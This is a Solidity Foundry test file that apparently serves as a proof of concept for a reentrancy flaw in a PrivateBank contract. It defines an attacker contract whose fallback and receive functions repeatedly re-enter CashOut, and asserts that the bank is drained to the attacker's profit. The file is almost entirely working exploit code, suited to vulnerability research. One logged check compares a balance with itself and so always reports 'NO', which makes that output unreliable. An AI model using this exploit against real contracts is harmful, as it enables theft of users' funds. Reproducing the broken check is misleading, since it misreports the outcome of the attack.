// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol";

contract MaliciousContract {
    PrivateBank privateBank;
    uint public attackCount;
    uint public attackAmount;

    constructor(address payable _privateBankAddress) {
        privateBank = PrivateBank(_privateBankAddress);
    }

    function deposit() public payable {
        // Deposit some funds to enable withdrawal
        privateBank.Deposit{value: msg.value}();
    }

    function attack(uint _amount) public {
        attackAmount = _amount;
        privateBank.CashOut(_amount);
    }

    fallback() external payable {
        if (address(privateBank).balance >= attackAmount && attackCount < 5) {
            attackCount++;
            privateBank.CashOut(attackAmount);
        }
    }

    receive() external payable {
        if (address(privateBank).balance >= attackAmount && attackCount < 5) {
            attackCount++;
            privateBank.CashOut(attackAmount);
        }
    }
}

contract PrivateBankTest is Test {
    PrivateBank privateBank;
    MaliciousContract maliciousContract;
    address attacker = address(0x666);
    address logAddress;

    function setUp() public {
        // Create a mock log contract address
        logAddress = address(new MockLog());
        
        // Deploy PrivateBank with the mock log address
        privateBank = new PrivateBank(logAddress);
        
        // Deploy malicious contract
        maliciousContract = new MaliciousContract(payable(address(privateBank)));
        
        // Fund the attacker and malicious contract
        vm.deal(attacker, 10 ether);
        vm.deal(address(maliciousContract), 10 ether);
    }

    function testReentrancyAttack() public {
        // Deposit funds into malicious contract
        vm.prank(address(maliciousContract));
        maliciousContract.deposit{value: 2 ether}();

        // Initial balance check
        uint initialBankBalance = address(privateBank).balance;
        assertEq(initialBankBalance, 2 ether);

        console2.log("\n--- BEFORE-Trigger State ---");
        console2.log("Bank contract ETH balance: %s ether", initialBankBalance / 1e18);
        console2.log("Malicious contract ETH balance: %s ether", address(maliciousContract).balance / 1e18);
        uint maliciousDepositBalanceBefore = privateBank.balances(address(maliciousContract));
        console2.log("Malicious contract deposit balance in bank: %s ether\n", maliciousDepositBalanceBefore / 1e18);

        console2.log("--- Executing Attack ---");
        vm.prank(attacker);
        maliciousContract.attack(1 ether);
        console2.log("Attack executed with amount: 1 ether\n");

        console2.log("--- AFTER-Trigger State ---");
        uint bankETHBalanceAfter = address(privateBank).balance;
        console2.log("Bank contract ETH balance: %s ether", bankETHBalanceAfter / 1e18);
        uint maliciousETHBalanceAfter = address(maliciousContract).balance;
        console2.log("Malicious contract ETH balance: %s ether", maliciousETHBalanceAfter / 1e18);
        uint maliciousDepositBalanceAfter = privateBank.balances(address(maliciousContract));
        console2.log("Malicious contract deposit balance in bank: %s ether\n", maliciousDepositBalanceAfter / 1e18);

        console2.log("--- Changes Detection ---");
        bool bankBalanceDecreasedSignificantly = bankETHBalanceAfter < initialBankBalance - 1 ether;
        bool maliciousBalanceIncreased = maliciousETHBalanceAfter > address(maliciousContract).balance;
        bool depositBalanceInconsistency = maliciousDepositBalanceAfter != maliciousDepositBalanceBefore - 1 ether * maliciousContract.attackCount();
        console2.log("Bank balance decreased >1 ether? %s", bankBalanceDecreasedSignificantly ? "YES" : "NO");
        console2.log("Malicious contract gained ETH? %s", maliciousBalanceIncreased ? "YES" : "NO");
        console2.log("Deposit balance inconsistency? %s\n", depositBalanceInconsistency ? "YES" : "NO");

        // Final vulnerability verification
        uint attackCount = maliciousContract.attackCount();
        if (attackCount > 0) {
            console2.log("Vulnerability Exists: Reentrancy attack succeeded (%s reentrant calls detected)", attackCount);
        } else {
            console2.log("Vulnerability not Exist: No reentrant calls detected during attack");
        }

        // Original assertions preserved
        assertGt(attackCount, 0, "Reentrancy attack failed");
        assertLt(address(privateBank).balance, initialBankBalance - 1 ether, "Bank balance not drained enough");
        assertGt(address(maliciousContract).balance, 2 ether, "Attacker didn't gain extra funds");
    }
}

contract MockLog {
    struct Message {
        address Sender;
        uint Time;
        uint Val;
        string Data;
    }
    
    Message[] public History;
    Message public LastMsg;

    function AddMessage(address _adr, uint _val, string memory _data) public {
        LastMsg.Sender = _adr;
        LastMsg.Time = block.timestamp;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}